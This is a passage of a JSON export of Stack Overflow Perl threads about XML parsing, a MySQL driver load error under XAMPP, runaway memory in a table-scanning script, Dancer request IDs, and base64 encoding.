href=\"http://stackoverflow.com/questions/33267765/why-is-xmlsimple-discouraged\"><i>Why is XML::Simple &quot;Discouraged&quot;?</i></a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462821507, "post_id": 37107589, "comment_id": 61788275, "body": "Please take a look at <a href=\"http://stackoverflow.com/help/someone-answers\"><i>What should I do when someone answers my question?</i></a>"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1467563742, "last_edit_date": 1467563742, "creation_date": 1462770306, "answer_id": 37108043, "question_id": 37107589, "link": "https://stackoverflow.com/questions/37107589/parsing-xml-and-displaying-contents/37108043#37108043", "title": "Parsing XML and Displaying contents", "body": "<p>Here's a solution using <a href=\"https://metacpan.org/pod/XML::LibXML\" rel=\"nofollow\"><code>XML::LibXML</code></a>. <a href=\"https://metacpan.org/pod/XML::Twig\" rel=\"nofollow\"><code>XML::Twig</code></a> is a good alternative that you may prefer</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse XML::LibXML;\n\nuse constant XML_URL =&gt; 'http://sapxi.dfssi.com/parser/book.xml';\n\nmy $doc = XML::LibXML-&gt;load_xml(location =&gt; XML_URL);\n\nmy ($book_1) = $doc-&gt;findnodes('/booklist/book[1]');\n\nmy ($title) = $book_1-&gt;findnodes('title[1]');\nmy @authors = $book_1-&gt;findnodes('author');\n\nprintf \"Book title: %s Author: %s\\n\",\n        $title-&gt;textContent,\n        join(', ', map $_-&gt;textContent, @authors);\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>Book title: Book 1 title Author: Book 1 author 1, Book 1 author 2\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1467563742, "creation_date": 1462766708, "last_edit_date": 1462771994, "question_id": 37107589, "link": "https://stackoverflow.com/questions/37107589/parsing-xml-and-displaying-contents", "title": "Parsing XML and Displaying contents", "body": "<p>I have XML from this link <a href=\"http://sapxi.dfssi.com/parser/book.xml\" rel=\"nofollow\"><code>http://sapxi.dfssi.com/parser/book.xml</code></a></p>\n\n<p>I want to get values from the first <code>book</code> element. Any idea how to parse it in Perl?</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Data::Dumper;\nuse XML::Simple;\nuse LWP::Simple;\n\nmy $parser = new XML::Simple;\n\nmy $url = 'http://sapxi.dfssi.com/parser/book.xml';\nmy $content = get $url or die \"Unable to get $url\\n\";\nmy $data = $parser-&gt;XMLin($content);\n\nprint Dumper($data);\nprint $data-&gt;{book}{title}-&gt;[0];\n</code></pre>\n\n<p>I always get</p>\n\n<blockquote>\n  <p>Not a HASH reference at ./xml_parser.pl line 20.</p>\n</blockquote>\n\n<p>All I want is to print the title <code>Book 1 title</code> and the author value.</p>\n\n<p>Output will be like this.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Book title: Book 1 title Author: Book 1 author 1, Book 1 author 2\n</code></pre>\n\n<p>Thanks in advance for helping.</p>\n\n<p>it should be print $data->{book}->[0]->{title};</p>\n"}, {"tags": ["mysql", "windows", "perl", "cgi", "dbi"], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 6308498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35a3f4a0db25c27fc65152737695f088?s=128&d=identicon&r=PG&f=1", "display_name": "gomaya", "link": "https://stackoverflow.com/users/6308498/gomaya"}, "is_accepted": true, "score": 0, "last_activity_date": 1463388220, "creation_date": 1463388220, "answer_id": 37249885, "question_id": 37107569, "link": "https://stackoverflow.com/questions/37107569/error-connecting-mysql-with-perl/37249885#37249885", "title": "Error connecting MySQL with Perl", "body": "<p>I found a way around this error.\nfirst i deleted the <strong>perl folder</strong> in <strong>xampp folder</strong> and i copied the <strong>perl folder</strong> in <strong>strawberry folder</strong> to the <strong>xampp folder</strong></p>\n\n<p><strong>delete</strong> the perl folder in <strong>C:\\xampp\\perl</strong> </p>\n\n<p>then go to \n<strong>C:\\strawberry and copy the perl folder to C:\\xampp</strong></p>\n\n<p>then restart xampp and run the program again.</p>\n"}], "owner": {"reputation": 1, "user_id": 6308498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35a3f4a0db25c27fc65152737695f088?s=128&d=identicon&r=PG&f=1", "display_name": "gomaya", "link": "https://stackoverflow.com/users/6308498/gomaya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 818, "favorite_count": 0, "accepted_answer_id": 37249885, "answer_count": 1, "score": -1, "last_activity_date": 1463388220, "creation_date": 1462766590, "last_edit_date": 1463128797, "question_id": 37107569, "link": "https://stackoverflow.com/questions/37107569/error-connecting-mysql-with-perl", "title": "Error connecting MySQL with Perl", "body": "<p>I want to connect MySQL with Perl by using DBI.\nThe problem is whenever I try to connect to MySQL by using CGI this error will come out :</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>Software error:\ninstall_driver(mysql) failed: Can't load 'C:/xampp/perl/vendor/lib/auto/DBD/mysql/mysql.dll' for module DBD::mysql: load_file:%1 is not a valid Win32 application at C:/xampp/perl/lib/DynaLoader.pm line 190.\n at (eval 6) line 3.\nCompilation failed in require at (eval 6) line 3.\nPerhaps a required shared library or dll isn't installed where expected\n at C:/xampp/htdocs/samples/insert1.cgi line 16.\n</code></pre>\n\n\n\n<p>This is the code that I have :</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"true\">\r\n<div class=\"snippet-code snippet-currently-hidden\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>#!\"C:\\xampp\\perl\\bin\\perl.exe\"\r\n\r\nuse strict;\r\nuse warnings;\r\n#include libraries\r\nuse CGI;\r\nuse CGI::Carp qw(fatalsToBrowser);\r\nuse DBI;\r\n \r\nprint \"Content-type: text/html\\n\\n\";\r\n \r\n## mysql user database name\r\nmy $db =\"mysql\";\r\n## mysql database user name\r\nmy $user = \"root\";\r\n \r\n## mysql database password\r\nmy $pass = \"\";\r\n \r\n## user hostname : This should be \"localhost\" but it can be diffrent too\r\nmy $host=\"localhost\";\r\n \r\n## SQL query\r\nmy $query = \"show tables\";\r\n \r\nmy $dbh = DBI-&gt;connect(\"DBI:mysql:$db:$host\", $user, $pass);\r\n\r\n\tmy $sqlQuery  = $dbh-&gt;prepare($query)\r\n\tor die \"Can't prepare $query: $dbh-&gt;errstr\\n\";\r\n \r\nmy $rc = $sqlQuery-&gt;execute\r\nor die \"can't execute the query: $sqlQuery-&gt;errstr\";\r\n #start the HTML\r\nprint \"Content-type:text/html\\r\\n\\r\\n\";\r\n\r\nprint \"&lt;HTML&gt;\";\r\nprint \"&lt;HEAD&gt;\";\r\nprint \"&lt;TITLE&gt;GeneMIS&lt;/TITLE&gt;\";\r\nprint \"&lt;/HEAD&gt;\";\r\nprint \"&lt;BODY bgcolor=white&gt;\";\r\nprint \"&lt;h3&gt;********** My Perl DBI Test ***************&lt;/h3&gt;\";\r\nprint \"&lt;p&gt;Here is a list of tables in the MySQL database $db.&lt;/p&gt;\";\r\nwhile (my @row= $sqlQuery-&gt;fetchrow_array()) {\r\nmy $tables = $row[0];\r\nprint \"$tables\\n&lt;br&gt;\";\r\n}\r\n \r\nmy $rc = $sqlQuery-&gt;finish;\r\n\r\n\r\n#end the HTML\r\nprint \"&lt;/BODY&gt;&lt;/HTML&gt;\";\r\nexit(0);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>My DBI is working just fine and I have mysql.dll in the folder already.\nI already included the path in Environment Variables but it's still not working.</p>\n"}, {"tags": ["mysql", "perl", "memory", "memory-leaks"], "comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1462753339, "post_id": 37106211, "comment_id": 61754551, "body": "Perl has an automatic garbage collector. It would be prudent for you to show the code you&#39;re using."}, {"owner": {"reputation": 3, "user_id": 6308081, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2f960d5634ae0f537e2131b3a8618df?s=128&d=identicon&r=PG", "display_name": "Rich", "link": "https://stackoverflow.com/users/6308081/rich"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1462754606, "post_id": 37106211, "comment_id": 61754803, "body": "I updated it with the code."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462757295, "post_id": 37106211, "comment_id": 61755439, "body": "Which part is taking most memory, do you know?  I updated my post with one more possibility (and am only now seeing the code you posted)."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462767030, "post_id": 37106211, "comment_id": 61757281, "body": "I can see a couple of bugs, but I can&#39;t see anything that would unnecessarily soak up memory. How much more is there of this program? Can you not show it all?"}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 0, "last_activity_date": 1572326183, "last_edit_date": 1572326183, "creation_date": 1462753584, "answer_id": 37106265, "question_id": 37106211, "link": "https://stackoverflow.com/questions/37106211/release-memory-from-script-in-the-middle-of-the-process/37106265#37106265", "title": "Release memory from script in the middle of the process", "body": "<p>It is really hard to tell without knowing at least something about how your program is organized.  </p>\n\n<p>I take it that you read data from a database into suitable data structures.  I also imagine that as you keep processing you read new data into yet new data structures.  All that memory is kept and I don't know of a way to get rid of it. I think you can't; Perl does not return memory to the OS at runtime as far as I know.  Here are some options to keep the memory footprint of your program from growing.</p>\n\n<ul>\n<li><p>The first thing to do is to re-use your data structures. Once you are done processing one set of data, read the new one into that same array or hash (or whatever you use). If you are using complex data structures then their components may be re-used.</p></li>\n<li><p>It seems from your question that this may amount to too much of a change. If that is so, one other thing I can think of is to wrap suitable sections of your code into subs, so that once it is done processing it goes out of scope and frees that memory.  Note, the memory will still be with the interpreter, but it can be re-used for the next such made-up sub so your footprint wouldn't grow.  That kind of a change may be more feasible.</p></li>\n<li><p>In case your growing memory demands are due to the simple fact that there is just more data coming into a few data structures, here is another thought.  Read (fetch, query) only a chunk of data at once, then when you are done processing it read the next chunk into the same array, etc.  This may or may not affect the database read performance but it will lead to a reduced memory footprint of the program.</p></li>\n</ul>\n\n<hr>\n\n<p><strong>Update (code posted)</strong> &nbsp;  I am still unable to tell where most memory goes but it seems that perhaps a few data structures (arrays?) simply grow larger and larger as data grows; just more and more data. In that case the last option above may be suitable.</p>\n"}, {"comments": [{"owner": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "edited": false, "score": 0, "creation_date": 1462801731, "post_id": 37107074, "comment_id": 61776013, "body": "+1  An alternative to <code>mysql_use_result</code> here would be to use DBI&#39;s <a href=\"https://metacpan.org/pod/DBI#column_info\" rel=\"nofollow noreferrer\"><code>column_info</code></a> or simply <code>SELECT * FROM $tbl WHERE 1=0</code>, since it is the NAMEs that the OP seems interested in."}, {"owner": {"reputation": 138098, "user_id": 1695906, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638d2ec6b52f3db1583890be23d74cc6?s=128&d=identicon&r=PG", "display_name": "Michael - sqlbot", "link": "https://stackoverflow.com/users/1695906/michael-sqlbot"}, "reply_to_user": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "edited": false, "score": 1, "creation_date": 1462806923, "post_id": 37107074, "comment_id": 61779770, "body": "@pilcrow thanks, and yikes, that&#39;s a really good point, which I overlooked... the results from the later statement handles don&#39;t actually seem to get iterated through at all. (?!)  Hopefully, this would not cause memory to leak <i>per se</i>, but it would waste a lot of memory and server resources, essentially reading entire tables into memory when the rows are not needed at all.  I suspect you have found the real issue, here, and my solution -- while probably still valid -- will only mask the real problem."}], "tags": [], "owner": {"reputation": 138098, "user_id": 1695906, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638d2ec6b52f3db1583890be23d74cc6?s=128&d=identicon&r=PG", "display_name": "Michael - sqlbot", "link": "https://stackoverflow.com/users/1695906/michael-sqlbot"}, "is_accepted": false, "score": 1, "last_activity_date": 1462761604, "creation_date": 1462761604, "answer_id": 37107074, "question_id": 37106211, "link": "https://stackoverflow.com/questions/37106211/release-memory-from-script-in-the-middle-of-the-process/37107074#37107074", "title": "Release memory from script in the middle of the process", "body": "<p>The issue is not readily apparent, here.  It doesn't look like there is an obvious memory leak, so trying to free up allocated memory may not be the problem you need to solve.  Perl can theoretically release memory back to the OS while running, but certain conditions have to be met and it's not a common occurrence, in my experience.  </p>\n\n<p>Setting <code>$dbh-&gt;{mysql_use_result} = 1;</code> after you connect to the db might help significantly.  </p>\n\n<p>This changes the way DBI (actually, libmysqlclient) reads incoming data from the socket, causing it to read data as needed every time you call a <code>fetchrow*</code> method rather than buffering it all into memory first, then handing you a row at a time from what it already has in memory, which is the default behavior.  </p>\n\n<p><code>DBD::mysql</code> and the underlying library may be the entity responsible for bulk of the memory usage, so this is worth a shot.  </p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1462767964, "creation_date": 1462767964, "answer_id": 37107734, "question_id": 37106211, "link": "https://stackoverflow.com/questions/37106211/release-memory-from-script-in-the-middle-of-the-process/37107734#37107734", "title": "Release memory from script in the middle of the process", "body": "<p>One thing that may be useful, the SQL statement <code>\"select * from $_k\"</code> is executed only to fetch the names of the columns. You might want to change that to <code>\"select * from $_k LIMIT 0\"</code> so that no data is retrieved. You should also move the <code>$sth2-&gt;finish</code> up before the <code>for</code> loop, although with the <code>LIMIT 0</code> fix in place that will make very little difference</p>\n\n<p>The resulting code looks like this</p>\n\n<pre><code>$_sql = \"select * from `$_k` LIMIT 0\";\nif ( $_debugChg ) {\n    print DBG \"\\tTable $_k (\" . duration( time() - $_startingTime ) . \" into action)\\n\";\n}\n$sth2 = $dbh-&gt;prepare($_sql);\n$sth2-&gt;execute;\n@_mb2 = @{ $sth2-&gt;{NAME} };\n$sth2-&gt;finish;\n</code></pre>\n\n<p>I don't know whether you're using <code>my</code> variables declared at the top of the file or package variables (declared with <code>our</code>, or just undeclared if you don't have <code>use strict 'vars'</code> in place. It's probably worth declaring everything with <code>my</code> at the tightest scope possible (which is standard best-practice). That way every variable is made temporary and will be destroyed at the end of the block where it is declared. It's hard to say much more without seeing the full program</p>\n"}], "owner": {"reputation": 3, "user_id": 6308081, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2f960d5634ae0f537e2131b3a8618df?s=128&d=identicon&r=PG", "display_name": "Rich", "link": "https://stackoverflow.com/users/6308081/rich"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1572326305, "creation_date": 1462752952, "last_edit_date": 1572326305, "question_id": 37106211, "link": "https://stackoverflow.com/questions/37106211/release-memory-from-script-in-the-middle-of-the-process", "title": "Release memory from script in the middle of the process", "body": "<p>I have a script that runs through hundreds if not thousands of tables from years of backups, to change content that people ask for.</p>\n\n<p>as of this month, it started using so much RAM that the server kills it.</p>\n\n<p>So, is there a way after each pull from the database, after I pull it and have my perl script run through the data, searching for the info to change, it resets the RAM before it pulls the next one?</p>\n\n<p>So basically it resets the data it just pulled, so that all of that is not in the RAM?</p>\n\n<p>I created this stuff in 2007, and I sure wish I had done it WAY different, but that would require a MAJOR overhaul and update and that is just no way I can do that now. Maybe in the future. But as of right now, I just cannot do that.</p>\n\n<p>So I need a way to keep this from happening.</p>\n\n<p>Please let me know if you know of a way to flush that memory.</p>\n\n<p>Thank you in advance if you can point me in the way.</p>\n\n<p>--- Update ---- added part of the website code that actually pulls all the data ----</p>\n\n<pre><code>        $_startingTime = time();\n        $dbh-&gt;do(qq{update `tun_changes` set `status` = \"working\", `startedT` = ? where `unid` = ?}, undef, $_startingTime, $_tr-&gt;{unid});\n        $sth2 = $dbh-&gt;prepare(qq{select * from `allmembers` where `mId` = ?});\n        $sth2-&gt;execute($_tr-&gt;{mId});\n        $_tregmem = $sth2-&gt;fetchrow_hashref();\n        $sth2-&gt;finish();\n        $dbh-&gt;do(qq{delete from `sessions` where `id` = \"$_tregmem-&gt;{last_sessid}\"}); #kill their logged in session, so it does not lock them up if they are logged in when we change their username...\n        $_un = $_tregmem-&gt;{tusername};\n        $_cust_id = $_tr-&gt;{mId};\n        $_notfinished = 0;\n        $_newUname = lc($_tr-&gt;{newun});\n        $_csusername = $_tr-&gt;{csusername};# if customer service rep...\n        $_count = 0;\n        $_changeFailed = 0;\n        $_changed = 0;\n        $_debugChg = 1;\n        if($_debugChg) {\n            open(DBG,\"&gt;&gt;/home$_website_username/required/files/urgent/all_chg_uname_debug_track.txt\");\n            seek(DBG,0,2);\n            print DBG \"Checking Table at \" . Format_Date_For_Viewing($_startingTime,\"\") . \" - indented two lines at least for this record.... until _end_ is shown\\n\";\n        }\n        @_mb = $dbh-&gt;tables;\n        $_tablesAffected = 0;\n        foreach $_k (@_mb) {\n            $_sql = \"select * from $_k\";\n            if($_debugChg) {\n                print DBG \"\\tTable $_k (\" . duration(time() - $_startingTime) . \" into action)\\n\";\n            }\n            $sth2 = $dbh-&gt;prepare($_sql);\n            $sth2-&gt;execute();\n            @_mb2 = @{$sth2-&gt;{NAME}};\n            foreach $_k2 (@_mb2) {\n                if($_debugChg) {\n                    print DBG \"\\t\\tColumn $_k2\";\n                }\n                if($_k2 =~ /tusername/i) {\n                    if($_debugChg) {\n                        print DBG \"\\t Checking for username entries in $_k2\\n\";\n                    }\n                    $_updated = $dbh-&gt;do(qq{update $_k SET `$_k2` = ? WHERE `$_k2` = ?}, undef, $_newUname, $_un);\n                    if($_updated) {\n                        $_changed += $_updated;\n                    } else {\n                        $_changeFailed += $_updated;\n                    }\n                } else {\n                    if($_debugChg) {\n                        print DBG \" - Not UN\\n\";\n                    }\n                }\n            }\n            $sth2-&gt;finish();\n            if($_debugChg) {\n                print DBG \"\\n\";\n            }\n        }\n        if($_debugChg) {\n            print DBG \"\\nFinished - Duration was: \" . duration(time() - $_startingTime) . \"\\n\";\n            print DBG \"\\n_end_\\n\\n\";\n            close(DBG);\n        }\n</code></pre>\n\n<p>I left the debugging code so that I can see what was done, in case of failures.</p>\n"}, {"tags": ["perl", "dancer", "plack", "psgi"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1462705423, "post_id": 37098430, "comment_id": 61740716, "body": "You can definitely add the Middleware in front of your Dancer program. Where&#39;s the problem with that?"}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462705537, "post_id": 37098430, "comment_id": 61740740, "body": "It&#39;s not a Debian package and depends on the Dancer app to run via Plack."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1462705546, "post_id": 37098430, "comment_id": 61740741, "body": "The <a href=\"https://metacpan.org/source/BIGPRESH/Dancer-1.3202/lib/Dancer/Request.pm#L130\" rel=\"nofollow noreferrer\">Dancer::Request object has an <i>id</i> property</a> that seems to be an auto-increment number. I will try out how to use it."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462705643, "post_id": 37098430, "comment_id": 61740767, "body": "How do you run it? It should be fine in your app.psgi (or .pl) to just wrap it. Plack::Builder will deal with it. Under the hood, it&#39;s all PSGI, just the interface to the web is different. That&#39;s the whole idea of PSGI."}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462705690, "post_id": 37098430, "comment_id": 61740775, "body": "Thanks, just tried: Looks like it&#39;s the <code>[hit #1]</code> counter used in logging. Should be a good ID combined with <code>$$</code> and <code>time</code> or <code>$^T</code>. Dancer apps could be run via <code>bin&#47;app.pl</code> using the build-in webserver. You also don&#39;t need a <code>app.psgi</code> file, the Dancer default <code>bin&#47;app.pl</code> also does the job."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462705916, "post_id": 37098430, "comment_id": 61740825, "body": "You can also &lt;strike&gt;steal&lt;/strike&gt;borrow the <a href=\"https://metacpan.org/source/BAYASHI/Plack-Middleware-RequestId-0.02/lib/Plack/Middleware/RequestId.pm#L27\" rel=\"nofollow noreferrer\">idea from Plack::Middleware::RequestId</a> and go with that. But as that is just a UUID that seems to use a random string, I would not rely on it to be honest. Furthermore, in case you are running your Dancer on CGI (you said not via Plack), all those stateful approaches are not going to work anyway."}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1462706077, "post_id": 37098430, "comment_id": 61740856, "body": "Plack will be used in production, but the Dancer webserver is good for development. <code>Data::UUID</code> actually claims: <i>A UUID is 128 bits long, and is guaranteed to be different from all other UUIDs/GUIDs generated until 3400 CE.</i> I added a <i>before</i> trigger. <code>var request_id =&gt; encode_base64url(Data::UUID-&gt;new-&gt;create_bin);</code>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1462706263, "post_id": 37098430, "comment_id": 61740901, "body": "Write it up as an answer."}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1462789387, "creation_date": 1462789387, "answer_id": 37113328, "question_id": 37098430, "link": "https://stackoverflow.com/questions/37098430/dancer-unique-request-id/37113328#37113328", "title": "Dancer unique request ID", "body": "<p>When I have needed unique IDs for use with Mojolicious, I've used <a href=\"http://search.cpan.org/~rjbs/Data-UUID/UUID.pm\" rel=\"nofollow\"><code>Data::UUID</code></a> which generates long (128bit) numbers in line with <a href=\"https://www.ietf.org/rfc/rfc4122.txt\" rel=\"nofollow\">RFC 4122</a> </p>\n\n<p>I can't be any more specific without a clearer idea of your use case, but this seems to work nicely:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Data::UUID;\n\nmy $gen = Data::UUID -&gt; new();\n\nmy $binary_uuid = $gen -&gt; create ;\n\nprint $gen -&gt; to_string ( $binary_uuid ),\"\\n\";\nprint $gen -&gt; to_hexstring ( $binary_uuid ),\"\\n\";\nprint $gen -&gt; to_b64string ( $binary_uuid ),\"\\n\";\n</code></pre>\n\n<p>You have a choice of output formats. You can, if it's useful to your application, create directly, e.g.:</p>\n\n<pre><code>my $gen = Data::UUID -&gt; new();\nmy $uuid = $gen -&gt; create_str ;\nprint $uuid, \"\\n\";\n#reformat output\nprint $gen -&gt; to_hexstring ( $uuid ),\"\\n\";\n</code></pre>\n"}], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 676, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1462789387, "creation_date": 1462700720, "question_id": 37098430, "link": "https://stackoverflow.com/questions/37098430/dancer-unique-request-id", "title": "Dancer unique request ID", "body": "<p>Is there any unique request ID in Dancer?</p>\n\n<p>Apache has mod_unique_id: <a href=\"http://httpd.apache.org/docs/current/mod/mod_unique_id.html\" rel=\"nofollow\">http://httpd.apache.org/docs/current/mod/mod_unique_id.html</a></p>\n\n<p>PSGI/Plack has a middleware module: <a href=\"http://search.cpan.org/~bayashi/Plack-Middleware-RequestId-0.02/lib/Plack/Middleware/RequestId.pm\" rel=\"nofollow\">http://search.cpan.org/~bayashi/Plack-Middleware-RequestId-0.02/lib/Plack/Middleware/RequestId.pm</a></p>\n\n<p>But is there anything native in Dancer I missed?</p>\n"}, {"tags": ["perl", "base64", "encode"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462716586, "post_id": 37097996, "comment_id": 61743689, "body": "You won&#39;t get helpful answers to your question unless you post the <i>real code</i> that you are running. The line <code>while ( read(FILE, $buf, 60*57 ) {</code> has imbalanced parentheses, and I am certain that <i>none</i> of that code &quot;works as intended&quot;. You must also <i>always</i> <code>use strict</code> and <code>use warnings &#39;all&#39;</code> at the top of every Perl program you write; there is very little point in using <code>my</code> unless they are in place"}], "answers": [{"tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 